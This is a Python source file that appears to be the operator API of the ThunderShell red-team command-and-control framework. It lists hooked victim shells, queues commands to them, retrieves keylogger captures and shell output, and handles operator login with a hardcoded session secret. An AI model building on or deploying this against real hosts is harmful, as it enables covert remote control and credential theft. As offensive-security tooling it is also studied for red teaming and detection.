#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/apis.py
"""

from core.utils import Utils
from core.log import Log
import hashlib
import json
import base64
import os
from time import sleep
from flask import Flask, session, request
from core.websync import Sync
import fnmatch


class ThunderShellFlaskAPI(Flask):

    """
    TODO: Implement all the same feature as the CLI:
            'fetch',
            'exec',
            'read',
            'upload',
            'ps',
            'inject',
            'alias',
            'delay',
            'help',
    """

    def init(self, config, web_config):
        self.sync = Sync(config)
        self.secret_key = 'lkasjdlkj'
        self.session = session
        self.request = request
        self.realconf = config
        self.sql = self.realconf.get('mysql')
        self.redis = self.realconf.get('redis')
        self.web_conf = web_config
        self.active_users = []
        self.msgs = []
        self.cmds = []
        self.username = ''
        self.command = ''

    def auth(self):
        if 'authenticated' in self.session:
            return True
        return False

    def get_user(self):
        if 'username' in self.session:
            return self.session['username']
        return 'unknown'

    def get_users(self):
        for user in self.redis.scan_data('*:active_users'):
            user = user.split(':')[0]
            if user not in self.active_users:
                self.active_users.append(user)
        return self.active_users

    def set_user(self):
        self.session['authenticated'] = True
        self.session['uid'] = Utils.guid()
        self.session['username'] = request.form['username'].strip()
        self.session['password'] = hashlib.sha512(request.form['password'].strip()).hexdigest()
        self.active_users.append(str(self.session['username']))
        Log.log_event('User Login', '%s' % str(self.session['username']))

    def post_login(self):
        try:
            if str(request.form['username'].strip()) in self.active_users:
                return False
            if self.request.form['password'].strip() == self.realconf.get('server-password'):
                self.set_user()
                self.get_users()
                return True
            return False
        except:
            pass
        return False

    def get_config(self, key):
        if self.web_conf.has_key(key):
            return self.web_conf[key]
        return ''

    def get_username(self):
        return self.session['username']

    def get_password(self):
        return self.session['password']

    def logout(self):
        try:
            self.active_users.remove(str(self.session['username']))
            Log.log_event('User Logout', '%s' % str(self.session['username']))
            self.session.pop('username')
            self.session.pop('authenticated')
        except ValueError:
            pass

    def send_msg(self, msg):
        self.msgs.append(msg)
        return ''

    def get_msgs(self):
        return self.msgs

    def hook_shell(self, uid, id):
        return self.sql.add_active_user(uid, id)

    def unhook_shell(self, uid, id):
        return self.sql.delete_active_user(uid, id)

    def send_cmd(self, id, cmd, username,):
        cmd_guid = Utils.guid()
        self.redis.append_shell_data(id, '[%s] %s Sending: \n%s\n\n' % (Utils.timestamp(), username, cmd))
        Log.log_shell(id, 'Sending', cmd, username=username)
        return self.redis.push_cmd(id, cmd, cmd_guid, username)

    def html_escape(self, data):
        html_escape_table = {
            '&': '&amp;',
            '"': '&quot;',
            "'": '&apos;',
            '>': '&gt;',
            '<': '&lt;',
            }
        return ''.join(html_escape_table.get(c, c) for c in data)

    def get_output(self, id):
        return self.sync.get_cmd_output(id, self.session['uid'])

    def get_input(self, id):
        return self.sync.get_cmd_send(self.session['uid'])

    def get_ip(self):
        host = self.realconf.get('http-host')
        return host

    def get_port(self):
        port = self.realconf.get('http-port')
        return port

    def get_log_date(self, name):
        dates = fnmatch.filter(os.listdir(os.getcwd() + '/logs/'), '*-*-*')
        log_dates = []
        for date in dates:
            if name == 'event':
                file_name = fnmatch.filter(os.listdir('%s/logs/%s' % (os.getcwd(), date)), 'event.log')
                if file_name:
                    if date not in log_dates:
                        log_dates.append(date)
            if name == 'http':
                file_name = fnmatch.filter(os.listdir('%s/logs/%s' % (os.getcwd(), date)), 'http.log')
                if file_name:
                    if date not in log_dates:
                        log_dates.append(date)
            if name == 'error':
                file_name = fnmatch.filter(os.listdir('%s/logs/%s' % (os.getcwd(), date)), 'error.log')
                if file_name:
                    if date not in log_dates:
                        log_dates.append(date)
            if name == 'chat':
                file_name = fnmatch.filter(os.listdir('%s/logs/%s' % (os.getcwd(), date)), 'chat.log')
                if file_name:
                    if date not in log_dates:
                        log_dates.append(date)
        return sorted(log_dates, key=lambda d: map(int, d.split('-')))

    def get_log_data(self, date, name):
        try:
            if name == 'event':
                log = '%s/logs/%s/event.log' % (os.getcwd(), date)
                return open('%s' % log, 'r').read()
            if name == 'http':
                log = '%s/logs/%s/http.log' % (os.getcwd(), date)
                return open('%s' % log, 'r').read()
            if name == 'error':
                log = '%s/logs/%s/error.log' % (os.getcwd(), date)
                return open('%s' % log, 'r').read()
            if name == 'chat':
                log = '%s/logs/%s/chat.log' % (os.getcwd(), date)
                return open('%s' % log, 'r').read()
            if name == 'dashboard':
                log = '%s/logs/%s/event.log' % (os.getcwd(), date)
                return open('%s' % log, 'r').read()
        except:
            return 'No recent activity.'

    def get_shells(self):
        try:
            shells_list = []
            shells = self.redis.scan_data('*:active:*')
            for shell in shells:
                shell_info = {
                    'shell_ip': shell.split(':')[2],
                    'shell_id': shell.split(':')[0],
                    'shell_prompt': self.redis.get_data('%s:prompt' % shell.split(':')[0]).split(' ')[1],
                    'shell_hostname': self.redis.get_data('%s:prompt' % shell.split(':')[0]).split(' ')[0],
                    'shell_timestamp': self.redis.get_data(shell),
                    }
                shells_list.append(shell_info)
            return shells_list
        except Exception, e:
            print e

    def get_shell_domain(self, id):
        domain = self.redis.get_data('%s:prompt' % id).split(' ')[1].split('\\')[0]
        return domain

    def get_shell_hostname(self, id):
        hostname = self.redis.get_data('%s:prompt' % id).split(' ')[0]
        return hostname

    def get_shell_user(self, id):
        user = self.redis.get_data('%s:prompt' % id).split(' ')[1].split('\\')[1]
        return user

    def get_payloads_name(self):
        return self.realconf.get('http-download-path')

    def get_protocol(self):
        if self.realconf.get('https-enabled') == 'on':
            return 'https://'
        else:
            return 'http://'

    def get_keylogger_data(self, id):
        return self.redis.get_data('%s:keylogger' % id)

    def get_shell_data(self, id):
        return self.redis.get_data('%s:shell-data' % id)

    def get_session_uid(self):
        return self.session['uid']

    def delete_shell(self, id, username):
        shells = self.redis.scan_data('*:active:*')
        self.send_cmd(id, 'exit', username)
        for shell in shells:
            if id in shell:
                self.redis.delete_entry(shell)


class ServerApi:

    def __init__(self, config, request):
        self.config = config
        self.request = request
        self.redis = self.config.get('redis')
        self.output = {}
        self.output['success'] = 1

    def process(self):
        try:
            callback = self.request.path.split('/')[2].lower()
            if callback == 'login':
                self.auth()
            elif callback == 'list':
                self.get_shells()
            elif callback == 'shell':
                self.get_shell_output()
        except:
            pass

        return json.dumps(self.output)

    def get_header(self, key):
        return self.request.headers.getheader(key)

    def auth(self):
        if hashlib.sha512(self.config.get('server-password')).hexdigest() == self.get_header('Authorization'):
            self.output['authorized'] = 1
            return True
        self.output['authorized'] = 0
        return False

    def get_shells(self):
        if self.auth():
            shells = []
            for shell in self.redis.get_all_shells():
                guid = shell.split(':')[0]
                prompt = self.redis.get_data('%s:prompt' % guid)
                shells.append('%s %s' % (guid, prompt))
            self.output['shells'] = shells

    def get_shell_output(self):
        if self.auth():
            try:
                guid = self.request.path.split('/')[3]
                guid = Utils.validate_guid(guid)
                path = Log.get_current_path('shell_%s.log' % guid)
                data = Utils.load_file(path, False, False)
                self.output['data'] = base64.b64encode(data)
            except:
                return

    def send_shell_cmd(self):
        if self.auth():
            try:
                guid = self.request.path.split('/')[3]
                guid = Utils.validate_guid(guid)
                self.redis.push_cmd(guid, self.get_post_data(), Utils.guid())
            except:
                return

    def get_post_data(self):
        length = 0
        if not self.headers.getheader('Content-Length') == None:
            length = int(self.headers.getheader('Content-Length'))
        return self.rfile.read(length)
